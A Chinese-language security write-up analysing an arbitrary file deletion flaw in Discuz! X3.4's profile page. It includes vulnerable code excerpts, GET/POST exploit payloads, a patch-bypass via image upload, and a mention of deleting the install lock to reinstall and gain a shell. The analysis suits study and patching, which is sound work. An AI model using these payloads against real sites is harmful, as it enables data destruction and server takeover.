discuzx3.4任意文件删除

漏洞分析
  • discuz

漏洞原因

代码中可控参数拼接到unlink可达到任意文件删除。可以删除安装锁通过重装getshell。

漏洞分析 01

存在漏洞的文件为/source/include/spacecp/spacecp_profile.php

定位到178行，代码如下

if($_GET['deletefile'] && is_array($_GET['deletefile']))
		foreach($_GET['deletefile'] as $key => $value) {
			if(isset($_G['cache']['profilesetting'][$key])&& $_G['cache']['profilesetting'][$key]['formtype'] == 'file') {
				@unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);
				@unlink(getglobal('setting/attachdir').'./profile/'.$verifyinfo['field'][$key]);
				$verifyarr[$key] = $setarr[$key] = '';
                echo 'ok';
			}
		}

可知deletefile和key的值可控，通过第二个if判断即可进入unlink执行的代码段。

discuz的$_G变量是程序的全局变量,用户登录信息、后台设置信息、服务器环境信息、客户端CooKies、数据缓存等都存放在$G变量里面。
$_G变量在 source/class/discuz/discuz_application.php 文件中初始化.

往上回溯到70行if(submitcheck('profilesubmit')),此语句为真时才会执行到178行。跟进submitcheck

function submitcheck($var, $allowget = 0, $seccodecheck = 0, $secqaacheck = 0) {
	if(!getgpc($var)) {
		return FALSE;
	} else {
		if($allowget || ($_SERVER['REQUEST_METHOD'] == 'POST' && empty($_SERVER['HTTP_X_FLASH_VERSION']) && (empty($_SERVER['HTTP_REFERER']) ||
		preg_replace("/https?:\/\/([^\:\/]+).*/i", "\\1", $_SERVER['HTTP_REFERER']) == preg_replace("/([^\:]+).*/", "\\1", $_SERVER['HTTP_HOST'])))) {
			return TRUE;
		} else {
			echo 'submit_invalid';exit;
		}
	}
}

我们得返回TURE，继续跟进getgpc

function getgpc($k, $type='GP') {
	$type = strtoupper($type);
	switch($type) {
		case 'G': $var = &$_GET; break;
		case 'P': $var = &$_POST; break;
		case 'C': $var = &$_COOKIE; break;
		default:
			if(isset($_GET[$k])) {
				$var = &$_GET;
			} else {
				$var = &$_POST;
			}
			break;
	}
    
	return isset($var[$k]) ? $var[$k] : NULL;
    
}

得出我们只要给profilesubmit赋了值就能通过if

下断点来测试，可以看到$_G['cache']['profilesetting']的存放的内容如下

选取其中一个作为key的值便可过if的前部分，至于后面部分判断类型的我们可以先注释掉。因为第一次漏洞暴露的时候官方修复方案是加了这了类型判断，第二次爆出后直接删掉了unlink。

查看$space存放的值

我们取共有的属性，这里取前端表单就能修改的参数，比如realname，在根目录下创建一个Li9hu.txt的测试文件，将realname的值设置成我们要删除的文件的位置

拼接后代码如下，达到文件删除效果。

    @unlink(getglobal('setting/attachdir').'./profile/'."../../../Li9hu.txt");

漏洞利用 01

修改内容为待删除文件路径并提交

使用如下payload:

    get: http://localhost:9001/home.php?mod=spacecp&deletefile[realname]=1
    post: formhash=31bd3f08&profilesubmit=1  #formhash用于验证，可在前端代码中搜索获取到。

攻击前

攻击后

此漏洞后续在if上加上了后面的判断，判断formtype类型是否是file，由于我们可控变量的类型基本上都是text或者select无法通过if，因此算是修复了此洞。 可事实并非如此，代码接着往下走依然有unlink点可以被攻击者利用。

我们上传文件控制$_FILES

190行说明我们的文件名要是$_G配置内已存在的变量。我们可依旧取 realname

    if(!isset($_G['cache']['profilesetting'][$key])) {
    				continue;

204行跟进init后可以知道我们上传的文件要有文件名，文件不要过大不然tmp_name会为空导致无法执行到下面去，文件内容不能为空。直接上传一个小一点的图片，因为在210行的if(!$upload->get_image_info($attach['target']))会检测是否是图片。

成功上传后代码会执行到倒数第二行，也就是删除文件的关键代码段.利用之前同样的办法将realname设置成我们要删除的文件位置即可。

 @unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);

漏洞利用 02

设置realname为要删除的文件位置并提交

刷新页面后查看源码修改realname的类型为file,并且选择一张小一点的图片，再提交。

此时目标文件将被删除

修复方案

更新官方补丁。 官方直接删掉了这几处unlink代码.
